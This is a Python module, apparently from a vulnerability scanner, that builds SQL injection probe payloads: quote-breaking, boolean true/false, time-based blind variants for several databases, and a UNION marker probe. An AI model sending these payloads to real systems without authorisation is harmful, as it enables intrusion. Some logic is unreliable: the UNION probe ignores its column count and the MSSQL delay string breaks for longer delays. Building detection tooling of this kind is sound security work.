#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Minimal, context-aware SQLi probe payloads."""

from __future__ import annotations

from typing import List, Tuple


def error_probes(original: str) -> List[Tuple[str, str]]:
    """Return (payload, label) pairs for error-based detection."""
    base = original if original else "1"
    return [
        (f"{base}'", "single-quote"),
        (f'{base}"', "double-quote"),
        (f"{base}`", "backtick"),
        (f"{base}' AND '1'='2", "AND false"),
    ]


def boolean_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str]]:
    """Return ((true_payload, true_label), (false_payload, false_label))."""
    base = original if original else "1"
    return (
        (f"{base} AND 1=1", "AND 1=1"),
        (f"{base} AND 1=2", "AND 1=2"),
    )


def boolean_numeric_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str], str]:
    """Numeric-context boolean probes; returns (true, false, numeric_base)."""
    numeric_base = original.strip() if original.strip().isdigit() else "1"
    return (
        (f"{numeric_base} AND 1=1", "numeric AND 1=1"),
        (f"{numeric_base} AND 1=2", "numeric AND 1=2"),
        numeric_base,
    )


def time_probe(original: str, delay: float, dbms: str = "") -> Tuple[str, str]:
    """Return (payload, label) for time-based blind detection."""
    base = original if original else "1"
    delay_i = max(2, int(delay))
    db = (dbms or "").lower()

    if db == "postgresql":
        inner = f"(SELECT CASE WHEN (1=1) THEN pg_sleep({delay_i}) ELSE pg_sleep(0) END)"
        return (f"{base}' AND {inner}-- ", f"pg_sleep({delay_i})")
    if db == "mssql":
        return (f"{base}'; WAITFOR DELAY '00:00:0{delay_i}'-- ", f"WAITFOR DELAY {delay_i}s")
    if db == "sqlite":
        return (f"{base}' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)-- ", "sqlite heavy")

    return (f"{base}' AND SLEEP({delay_i})-- ", f"SLEEP({delay_i})")


def union_probe(original: str, columns: int = 2) -> Tuple[str, str]:
    """Light UNION probe (used only after error confirmation)."""
    base = original if original else "1"
    nulls = ",".join(["NULL"] * max(1, columns))
    marker = "0x4b535049"  # 'KSPI' hex marker
    return (
        f"{base}' UNION SELECT {marker},{marker}-- ",
        f"UNION SELECT x{max(1, columns)}",
    )
